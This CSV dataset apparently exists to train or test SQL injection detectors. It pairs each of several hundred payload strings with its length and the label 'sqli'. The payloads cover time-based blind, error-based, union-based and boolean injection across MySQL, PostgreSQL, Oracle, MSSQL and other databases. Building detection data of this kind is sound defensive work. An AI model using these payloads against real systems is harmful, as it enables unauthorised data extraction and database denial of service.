payload,length,attack_type
"1""));select count(*) from generate_series(1,5000000)--",54,sqli
"-4305) as ldrt where 2567=2567 union all select 2567,2567,2567,2567,2567,2567,2567#",83,sqli
"1)) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((8867=8867",158,sqli
1')) as jtmf where 3937=3937;select case when 7717=7717 then 1 else null end--,78,sqli
1'||(select 'goen' from dual where 8586=8586;select (case when (2132=8969) then 1 else 2132*(select 2132 from master..sysdatabases) end)--,138,sqli
-6129) as vuze where 1565=1565 or (8459=8459)*4906--,52,sqli
"1' where 1031=1031 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",124,sqli
"-3707""))) or 8571=8571--",24,sqli
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",105,sqli
1') as uwmy where 6980=6980;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,92,sqli
"1%"")));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",104,sqli
"1'||(select 'zifu' from dual where 4822=4822 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",142,sqli
1) as ozga where 4002=4002 and 6969=(select 6969 from pg_sleep(5))--,68,sqli
"1%""));select * from generate_series(2382,2382,case when (2382=4352) then 1 else 0 end) limit 1--",96,sqli
1);begin user_lock.sleep(5); end,32,sqli
"-7884"" where 3297=3297 or 2492=6158",35,sqli
1)) as lkqx where 6468=6468 or (select * from (select(sleep(5)))sddo)#,70,sqli
1');waitfor delay '0:0:5',25,sqli
1') or 4240=(select 4240 from pg_sleep(5))--,44,sqli
"1')) as efmy where 7299=7299 and 8635=(select count(*) from generate_series(1,5000000))--",89,sqli
"-9361"")) union all select 3112#",31,sqli
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'zlxw'='zlxw",109,sqli
"1'||(select 'baur' from dual where 9384=9384 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",153,sqli
1' where 4115=4115;select (case when (2501=4688) then 2501 else cast(1 as int)/(select 0 from dual) end) from dual--,116,sqli
"1"") where 1144=1144 and 2006=2006",33,sqli
1' and (5116=1602)*1602,23,sqli
"1%"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",168,sqli
"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('drvk' like 'drvk",231,sqli
1%'))) rlike (select * from (select(sleep(5)))sgvo) and ((('%'=',64,sqli
1') where 7903=7903;select (case when (8841=9675) then 8841 else cast(1 as int)/(select 0 from dual) end) from dual--,117,sqli
1') as bihs where 4197=4197;select pg_sleep(5)--,48,sqli
"1%"");select count(*) from generate_series(1,5000000) and (""%""=""",63,sqli
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",107,sqli
"1"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""gvlc"" like ""gvlc",130,sqli
"1'||(select 'ukfj' where 7133=7133 union all select null,null,null#",67,sqli
"-9487)) as rvck where 9404=9404 or make_set(8921=6045,6045)--",61,sqli
"1%"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""%""=""",106,sqli
"1"") union all select null,null,null,null--",42,sqli
"1')) as qhpv where 7049=7049 and make_set(8403=8403,8899)--",59,sqli
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('zfrs'='zfrs",125,sqli
"-8073))) union all select 4481,4481,4481,4481--",47,sqli
"1'||(select 'kfyh' where 4737=4737 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))||'",239,sqli
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('zdkn'='zdkn",109,sqli
1%' and 4595=4595#,18,sqli
"1')) as wdor where 7426=7426;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",113,sqli
"1');iif(5257=5257,1,1/0)",24,sqli
"1' in boolean mode) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)#",111,sqli
"-1876'||(select 'itfc' from dual where 9584=9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",107,sqli
"1'||(select 'ymez' from dual where 9870=9870 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",146,sqli
"1') where 6274=6274 or 8156=(select count(*) from generate_series(1,5000000))--",79,sqli
"1"" where 3933=3933 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",109,sqli
"1%"";select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",97,sqli
"1') or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",112,sqli
"1"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",112,sqli
-1190' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'yxry' like 'yxry,259,sqli
-6100') as kvfc where 2377=2377 or 6872=6872--,46,sqli
"1%""))) union all select null,null#",34,sqli
"1%""));select benchmark(5000000,md5(0x4c4d6142)) and ((""%""=""",59,sqli
"1%') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('%'='",118,sqli
1%')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('%'=',77,sqli
"1)) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((7200=7200",120,sqli
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))-- kegk",69,sqli
1') where 2227=2227;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,103,sqli
-5470')) or (8459=8459)*4906 and (('oeam'='oeam,47,sqli
"1%"") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli
"1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('cbwx'='cbwx",219,sqli
1 and (3020=3020)*6703-- zsnl,29,sqli
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (3836=3836,220,sqli
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# bzoq",100,sqli
"1"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",95,sqli
"1"") where 9461=9461 union all select null,null,null,null,null,null,null,null,null#",82,sqli
-9340) where 5462=5462 or 3038=3038,35,sqli
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",90,sqli
1'+(select wpkh where 5842=5842;select sleep(5))+',50,sqli
1%')) rlike sleep(5) and (('%'=',32,sqli
"1'||(select 'hvqw' from dual where 4423=4423 union all select null,null,null--",78,sqli
1') as dqgr where 2427=2427 and (3020=3020)*6703--,50,sqli
"1' in boolean mode) union all select null,null,null,null,null,null#",67,sqli
"1%"" or sleep(5)#",16,sqli
"1%"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""%""=""",107,sqli
1';waitfor delay '0:0:5'--,26,sqli
"1') as hlbq where 2347=2347 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",225,sqli
"-3620'||(select 'kmei' where 8533=8533 union all select 8533,8533,8533,8533--",77,sqli
"-6815) where 2498=2498 union all select 2498,2498,2498,2498,2498--",66,sqli
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'bwrb' like 'bwrb",117,sqli
"1%"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",200,sqli
"1)) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((9914=9914",119,sqli
1%')));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,115,sqli
"1) where 7684=7684 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",159,sqli
"-8844""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",140,sqli
"1%'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('%'='",63,sqli
"1%"") and 9764=6037 and (""%""=""",29,sqli
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",104,sqli
"1""))) and (3020=3020)*6703 and (((""fqap"" like ""fqap",51,sqli
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('ibrj'='ibrj",128,sqli
"1) as qyic where 9736=9736 and elt(3114=3114,sleep(5))#",55,sqli
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ygfv'='ygfv",117,sqli
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'ggcm' like 'ggcm",128,sqli
"1'||(select 'lxpg' where 7390=7390 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",135,sqli
"-9688%'))) or elt(3695=7995,7995) and ((('%'='",46,sqli
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",68,sqli
"-8245"")) or 3038=3038",21,sqli
1));select pg_sleep(5) and ((4382=4382,38,sqli
1' where 9216=9216;select sleep(5)--,36,sqli
"1%""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""%""=""",78,sqli
1) as xwgf where 4204=4204 and sleep(5)--,41,sqli
"1'||(select 'mjkz' where 9430=9430 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",225,sqli
"1 where 7412=7412 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",125,sqli
1'))) rlike (select (case when (5855=7142) then 1 else 0x28 end)) and ((('fkhd'='fkhd,85,sqli
"-3370' in boolean mode) union all select 3432,3432,3432,3432#",61,sqli
"-5161%"" or (1437=4869)*4869 and ""%""=""",37,sqli
"-3282') union all select 9002,9002,9002,9002,9002#",50,sqli
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",93,sqli
"1'+(select ohqr where 5610=5610;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",93,sqli
1%');(select * from (select(sleep(5)))srmq) and ('%'=',54,sqli
"1 where 5627=5627 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",80,sqli
"1)) union all select null,null,null,null#",41,sqli
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('wgbh'='wgbh",171,sqli
"1) where 3740=3740 union all select null,null,null,null,null,null,null,null--",77,sqli
"1'+(select 'rguk' where 6019=6019 union all select null,null,null,null,null--",77,sqli
"1) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",141,sqli
"1"") where 5850=5850 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",112,sqli
"-4025"" or 3038=3038",19,sqli
"1"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""jebr"" like ""jebr",212,sqli
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",98,sqli
"1"") as jngl where 8384=8384 and 4580=1718--",43,sqli
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'tqvy' like 'tqvy",121,sqli
1%' waitfor delay '0:0:5' and '%'=',35,sqli
"1%' or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",141,sqli
"1"") as lexx where 2892=2892 or elt(6272=6272,sleep(5))--",56,sqli
"-2414%"") or elt(1032=1032,3623) and (""%""=""",42,sqli
"1)) as bwrg where 3254=3254 union all select null,null,null,null,null,null--",76,sqli
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""lsvg"" like ""lsvg",116,sqli
"-4236) union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",69,sqli
1'))) or 4240=(select 4240 from pg_sleep(5))--,46,sqli
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('ochr' like 'ochr",104,sqli
1'+(select 'ezpy' where 5282=5282 order by 1#,45,sqli
"1"") where 9656=9656 and sleep(5)--",34,sqli
"1%"") or (select * from (select(sleep(5)))ydpu) and (""%""=""",57,sqli
"1))) or 8421=(select count(*) from generate_series(1,5000000)) and (((5340=5340",79,sqli
"-5731"" union all select 3083,3083,3083#",39,sqli
-4173') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('jdwt' like 'jdwt,216,sqli
"1) as azdb where 4219=4219 union all select null,null,null,null#",64,sqli
"1""))) and elt(1750=7826,7826) and (((""qcro""=""qcro",49,sqli
"1' where 4102=4102 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",109,sqli
"1%"" union all select null,null,null--",37,sqli
"1)));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",92,sqli
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'idxa'='idxa",221,sqli
"-8614') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",138,sqli
"-7601""))) union all select 1293,1293,1293,1293,1293,1293,1293,1293--",68,sqli
1) where 9446=9446 union all select null#,41,sqli
"1) as otsb where 8380=8380 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",102,sqli
"1"")) and 7533=7533 and ((""gkca""=""gkca",37,sqli
"1%"");select count(*) from generate_series(1,5000000)--",54,sqli
"1"" where 5406=5406 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",110,sqli
"1')) as nxhp where 2649=2649 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli
"-4168') union all select 2618,2618#",35,sqli
"-2131"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""wpsf"" like ""wpsf",208,sqli
"1'||(select 'ymre' where 8681=8681;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",122,sqli
1'+(select 'wsjk' where 3291=3291;select (case when (9816=1693) then 9816 else cast(1 as int)/(select 0 from dual) end) from dual--,131,sqli
"-8609' union all select 9384,9384,9384,9384--",45,sqli
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('uwbh'='uwbh",171,sqli
"1""))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((""wile"" like ""wile",138,sqli
"1"") where 4660=4660 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",117,sqli
1%');select case when 7717=7717 then 1 else null end--,54,sqli
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",62,sqli
"1%'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='",190,sqli
1) where 8041=8041;select (case when (5970=2200) then 1 else 5970*(select 5970 from master..sysdatabases) end)--,112,sqli
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('peyy'='peyy",119,sqli
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('hmsu'='hmsu",103,sqli
"1') as myxr where 6299=6299 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,sqli
"-4699) as mymz where 3405=3405 or elt(1032=1032,3623)--",55,sqli
1%' and 7366=9197#,18,sqli
"1')) as kfnt where 8090=8090 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",120,sqli
"1"")) as mlid where 1047=1047 union all select null,null#",56,sqli
1') as ibaw where 2130=2130 and 9198=9198--,43,sqli
1')) as clbc where 5649=5649;begin dbms_lock.sleep(5); end--,60,sqli
"1)) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",141,sqli
"1 where 6408=6408 union all select null,null,null,null,null,null,null,null--",76,sqli
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))# eahg",109,sqli
"1%"");select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",102,sqli
"1,(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",96,sqli
-1890'))) or 8526=1389 and ((('ecgt'='ecgt,42,sqli
"1%"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""%""=""",108,sqli
"1"") where 6821=6821 waitfor delay '0:0:5'--",43,sqli
"-8038')) or elt(1032=1032,3623) and (('xfyq'='xfyq",50,sqli
"1') and make_set(9961=6559,6559) and ('exde'='exde",50,sqli
"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('mexd' like 'mexd",118,sqli
"-4944%"")) or make_set(1084=1988,1988) and ((""%""=""",49,sqli
"-6680""))) union all select 2564,2564,2564,2564,2564,2564#",57,sqli
1'+(select zmbu where 8685=8685 rlike (select (case when (7689=7689) then 1 else 0x28 end)))+',94,sqli
1) where 1013=1013 and 5573=9445#,33,sqli
"-5969"" where 9248=9248 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",226,sqli
-9708' where 8150=8150 or 6872=6872--,37,sqli
1')) or 6793=(select 6793 from pg_sleep(5)) and (('zjun'='zjun,62,sqli
"make_set(6174=9734,1)",21,sqli
"1"")) as uels where 9447=9447 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",104,sqli
"1%');iif(5257=5257,1,1/0)",25,sqli
1'+(select 'rkap' where 9692=9692;waitfor delay '0:0:5')+',58,sqli
"1) where 2010=2010;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",110,sqli
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('pwuy'='pwuy",82,sqli
"1%""))) and 2006=2006",20,sqli
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)-- vhmc",74,sqli
"1'||(select 'ggfx' where 4932=4932 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'",112,sqli
"1%'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",79,sqli
"1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('%'='",101,sqli
"1%"")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",108,sqli
"1%""))) union all select null,null,null,null,null,null,null,null#",64,sqli
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",86,sqli
"1') union all select null,null,null,null,null#",46,sqli
"1"") as jiiq where 6847=6847;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",124,sqli
1%'))) and 6969=(select 6969 from pg_sleep(5)) and ((('%'=',59,sqli
1'+(select qugu where 2287=2287 order by 1#,43,sqli
1%';select sleep(5) and '%'=',29,sqli
"1'+(select tvpj where 7058=7058 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",94,sqli
"1"")) and elt(4249=4249,7259) and ((""abcm"" like ""abcm",52,sqli
1')) as xcvg where 1157=1157 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,90,sqli
1') where 3730=3730 and sleep(5)#,33,sqli
"1%')) and elt(1210=1210,sleep(5)) and (('%'='",45,sqli
"1'+(select 'aphz' where 1933=1933 union all select null,null,null,null,null,null#",81,sqli
"1"")) as maxe where 5883=5883 union all select null,null,null,null,null,null,null,null,null#",91,sqli
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('zcrh'='zcrh",219,sqli
"1"" where 8732=8732;begin dbms_lock.sleep(5); end--",50,sqli
-7950') or 9323=9323#,21,sqli
(select (case when (6783=6783) then 1 else 1/(select 0) end)),61,sqli
"1) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (8929=8929",156,sqli
1')) as zbkp where 1720=1720 and 4110=6748#,43,sqli
1');select (case when (3855=3855) then 3855 else 1/(select 0) end)--,68,sqli
"1'+(select gblp where 6768=6768;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",119,sqli
-2806'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('rxzr'='rxzr,209,sqli
1' in boolean mode) waitfor delay '0:0:5'--,43,sqli
"-5779) union all select 6089,6089--",35,sqli
"-4580"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""dbhb""=""dbhb",218,sqli
1');select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,87,sqli
"1 or elt(5873=5873,sleep(5))#",29,sqli
-2303')) as exyt where 2528=2528 or 8571=8571--,47,sqli
"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",123,sqli
"1""));select benchmark(5000000,md5(0x4c4d6142)) and ((""vcvb"" like ""vcvb",70,sqli
"1 or 8466=benchmark(5000000,md5(0x694a4745))-- rlas",51,sqli
1))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((5368=5368,224,sqli
-5555)) as ldte where 4583=4583 order by 1#,43,sqli
"1)) as hrks where 7637=7637 or elt(6272=6272,sleep(5))--",56,sqli
"1%""));select sleep(5)#",22,sqli
"1""))) rlike sleep(5)#",21,sqli
-1908'))) union all select 7665#,32,sqli
"1') where 6988=6988 union all select null,null,null,null,null,null,null,null--",78,sqli
"1 where 7196=7196 or 8466=benchmark(5000000,md5(0x694a4745))--",62,sqli
"-9725) where 9068=9068 or elt(4723=1426,1426)--",47,sqli
"-6014"" or make_set(3003=2609,2609)",34,sqli
-9393' where 3119=3119 or 8571=8571--,37,sqli
"1) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",172,sqli
"-6145'+(select nnjn where 1389=1389 union all select 1389,1389,1389--",69,sqli
"1%""))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",105,sqli
"1%"")) and (select * from (select(sleep(5)))gcrr)#",49,sqli
"1)) as rroe where 4840=4840;select * from generate_series(3607,3607,case when (3607=4242) then 1 else 0 end) limit 1--",118,sqli
"-9854%""))) or 6455=3652",23,sqli
"-3279"" union all select 8568,8568,8568,8568--",45,sqli
"1'||(select 'ozoj' where 1608=1608;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",102,sqli
1'))) or (select * from (select(sleep(5)))ydpu) and ((('ljhc'='ljhc,67,sqli
"1"") where 9223=9223 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",124,sqli
"1'||(select 'xasp' from dual where 4025=4025 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",151,sqli
1) where 8232=8232 and (3020=3020)*6703--,41,sqli
"1') and elt(4249=4249,7259) and ('bxnn'='bxnn",45,sqli
1'+(select xruo where 5709=5709 and 7533=7533)+',48,sqli
"1%'))) or elt(6272=6272,sleep(5)) and ((('%'='",46,sqli
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('jfwt' like 'jfwt",71,sqli
"1"") union all select null,null,null,null,null,null,null,null,null--",67,sqli
"1'+(select 'gqsk' where 3087=3087 union all select null,null,null,null--",72,sqli
"1"") as kslq where 8669=8669 and 8635=(select count(*) from generate_series(1,5000000))--",88,sqli
"1"" and elt(4594=1040,1040)",26,sqli
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('tetk'='tetk",110,sqli
"1');select benchmark(5000000,md5(0x4c4d6142))",45,sqli
-1587') or 8339=5540,20,sqli
"-4100')) union all select 1163,1163,1163--",42,sqli
"-4828'+(select qxnw where 9488=9488 union all select 9488,9488--",64,sqli
"-9176')) as eunw where 5978=5978 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",163,sqli
-8625 or 3176=2519# fvgl,24,sqli
